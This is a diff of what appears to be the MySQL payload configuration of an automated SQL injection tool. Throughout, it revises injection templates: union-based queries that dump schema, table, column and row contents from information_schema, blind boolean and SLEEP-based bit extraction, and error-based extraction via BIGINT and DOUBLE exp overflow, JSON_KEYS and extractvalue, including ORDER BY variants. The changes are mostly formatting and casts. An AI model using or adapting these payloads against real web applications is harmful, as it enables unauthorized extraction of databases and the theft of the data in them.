@@ -21,7 +21,7 @@ select concat(
             ${ENCLOSE_VALUE_HEX},
             r,
             ${SEPARATOR_QTE_HEX},
-            cast(q as char),
+            q,
             ${ENCLOSE_VALUE_HEX}
             order by r
             separator ${SEPARATOR_CELL_HEX}
@@ -32,7 +32,7 @@ select concat(
 ) from (
     select
         cast(SCHEMA_NAME as char) r,
-        count(TABLE_NAME) q
+        cast(count(TABLE_NAME) as char) q
     from INFORMATION_SCHEMA.tables t
     right join INFORMATION_SCHEMA.schemata s
     on s.SCHEMA_NAME = t.table_schema
@@ -44,9 +44,9 @@ select concat(
 select concat(
     group_concat(
         ${ENCLOSE_VALUE_HEX},
-        cast(r as char),
+        r,
         ${SEPARATOR_QTE_HEX},
-        cast(ifnull(q,0x30) as char),
+        q,
         ${ENCLOSE_VALUE_HEX}
         order by r
         separator ${SEPARATOR_CELL_HEX}
@@ -54,8 +54,8 @@ select concat(
     ${TRAIL_HEX}
 ) from (
     select
-        TABLE_NAME r,
-        table_rows q
+        cast(TABLE_NAME as char) r,
+        cast(ifnull(table_rows, 0x30) as char) q
     from information_schema.tables
     where TABLE_SCHEMA = 0x${DATABASE.HEX}
     order by r
@@ -66,7 +66,7 @@ select concat(
 select concat(
     group_concat(
         ${ENCLOSE_VALUE_HEX},
-        cast(n as char),
+        n,
         ${SEPARATOR_QTE_HEX},
         0,
         ${ENCLOSE_VALUE_HEX}
@@ -75,7 +75,7 @@ select concat(
     ),
     ${TRAIL_HEX}
 ) from (
-    select COLUMN_NAME n
+    select cast(COLUMN_NAME as char) n
     from information_schema.columns
     where TABLE_SCHEMA = 0x${DATABASE.HEX}
     and TABLE_NAME = 0x${TABLE.HEX}
@@ -90,7 +90,7 @@ select concat(
         ${ENCLOSE_VALUE_HEX},
         r,
         ${SEPARATOR_QTE_HEX},
-        cast(q as char),
+        q,
         ${ENCLOSE_VALUE_HEX}
         order by r
         separator ${SEPARATOR_CELL_HEX}
@@ -99,15 +99,15 @@ select concat(
 ) from (
     select
         cast(concat(${FIELDS}) as char) r,
-        count(*) q
+        cast(count(*) as char) q
     from `${DATABASE}`.`${TABLE}`
     group by r
     {limit}
 )x
                 </query>
                 <fields>
-                <field>trim(ifnull(`${FIELD}`,0x00))</field>
-                <concat>,0x7f,</concat>
+                    <field>trim(ifnull(`${FIELD}`, 0x00))</field>
+                    <concat>,0x7f,</concat>
                 </fields>
             </row>
         </schema>
@@ -148,71 +148,90 @@ as char)
         )
 )
             </slidingWindow>
-            <limit> limit ${LIMIT},65536</limit>
+            <limit>limit ${LIMIT}, 65536</limit>
             <failsafe>1337${INDICE}7330%2b1</failsafe>
-            <calibrator>repeat(${CALIBRATOR_HEX},65536)</calibrator>
+            <calibrator>repeat(${CALIBRATOR_HEX}, 65536)</calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${INDICES}</indices>
-            <capacity>(select concat(${LEAD_HEX},${INDICE},${CALIBRATOR}))</capacity>
-            <orderBy> order by 1337</orderBy>
+            <indices>union select ${INDICES}</indices>
+            <capacity>(select concat(${LEAD_HEX}, ${INDICE}, ${CALIBRATOR}))</capacity>
+            <orderBy>order by 1337</orderBy>
         </normal>
         <boolean>
             <test>
-                <false>true=false</false>
-                <false>true%21=true</false>
-                <false>false%21=false</false>
-                <false>1=2</false>
-                <false>1%21=1</false>
-                <false>2%21=2</false>
-                <true>true=true</true>
-                <true>false=false</true>
-                <true>true%21=false</true>
-                <true>1=1</true>
-                <true>2=2</true>
-                <true>1%21=2</true>
-                <initialization>0%2b1=1</initialization>
-                <bit>ascii(substring(${INJECTION},${INDEX},1))%26${BIT}</bit>
-                <length>char_length(${INJECTION})>${INDEX}</length>
+                <false>true = false</false>
+                <false>true%21 = true</false>
+                <false>false%21 = false</false>
+                <false>1 = 2</false>
+                <false>1%21 = 1</false>
+                <false>2%21 = 2</false>
+                <true>true = true</true>
+                <true>false = false</true>
+                <true>true%21 = false</true>
+                <true>1 = 1</true>
+                <true>2 = 2</true>
+                <true>1%21 = 2</true>
+                <initialization>0%2b1 = 1</initialization>
+                <bit>ascii(substring(${INJECTION}, ${INDEX}, 1))%26${BIT}</bit>
+                <length>char_length(${INJECTION}) > ${INDEX}</length>
             </test>
-            <blind> and ${TEST}</blind>
-            <time> and if(${TEST},1,SLEEP(${SLEEP_TIME}))</time>
+            <blind>and ${TEST}</blind>
+            <time>and if(${TEST}, 1, SLEEP(${SLEEP_TIME}))</time>
         </boolean>
         <error>
             <method>
                 <name>BIGINT::exp</name>
                 <query>
-and !(select*from(
-    ${WINDOW}
-)x)-~0
+and !(
+    select * from (
+        ${WINDOW}
+    )x
+)-~0
                 </query>
                 <capacity>64</capacity>
             </method>
             <method>
                 <name>BIGINT::exp in Order By</name>
                 <query>
-1, (select 1 from(select !(select*from(
-    ${WINDOW}
-)x)-~0)x)
+1, (
+    select 1 
+    from (
+        select !(
+            select * from (
+                ${WINDOW}
+            )x
+        )-~0
+    )x
+)
                 </query>
                 <capacity>64</capacity>
             </method>
             <method>
                 <name>DOUBLE::exp</name>
                 <query>
-and 1 = exp(~(select*from(
-    ${WINDOW}
-)x))
+and 1 = exp(
+    ~(
+        select * from (
+            ${WINDOW}
+        )x
+    )
+)
                 </query>
                 <capacity>64</capacity>
             </method>
             <method>
                 <name>DOUBLE::exp in Order By</name>
                 <query>
-1, (select exp(~(select*from(
-    ${WINDOW}
-)x)))
+1, (
+    select exp(
+        ~(
+            select * from (
+                ${WINDOW}
+            )x
+        )
+    )
+)
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -252,9 +271,15 @@ or exists(
                 <name>JSON::json_keys</name>
                 <query>
 /* Require FALSE statement, then OR */
-and 1=0 or 1 = (select JSON_KEYS(cast((select*from(
-    ${WINDOW}
-)x)as char)))
+and 1=0 or 1 = (
+    select JSON_KEYS (
+        cast ((
+            select * from (
+                ${WINDOW}
+            )x
+        ) as char)
+    )
+)
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -262,27 +287,45 @@ and 1=0 or 1 = (select JSON_KEYS(cast((select*from(
                 <name>JSON::json_keys in Order By</name>
                 <query>
 /* Require FALSE statement, then OR */
-1,(select JSON_KEYS(cast((select*from(
-    ${WINDOW}
-)x)as char)))
+1, (
+    select JSON_KEYS(
+        cast((
+            select * from (
+                ${WINDOW}
+            )x
+        )as char)
+    )
+)
                 </query>
                 <capacity>64</capacity>
             </method>
             <method>
                 <name>XML::extractvalue</name>
                 <query>
-and 1 = extractvalue(0x0a,concat(0x0a,(
-    ${WINDOW}
-)))
+and 1 = extractvalue(
+    0x0a, 
+    concat(
+        0x0a,
+        (${WINDOW})
+    )
+)
                 </query>
                 <capacity>99</capacity>
             </method>
             <method>
                 <name>XML::extractvalue in Order By</name>
                 <query>
-1, (select 1 from(select extractvalue(0x0a,concat(0x0a,(
-    ${WINDOW}
-))))x)
+1, (
+    select 1 from (
+        select extractvalue(
+            0x0a, 
+            concat(
+                0x0a, 
+                (${WINDOW})
+            )
+        )
+    )x
+)
                 </query>
                 <capacity>99</capacity>
             </method>
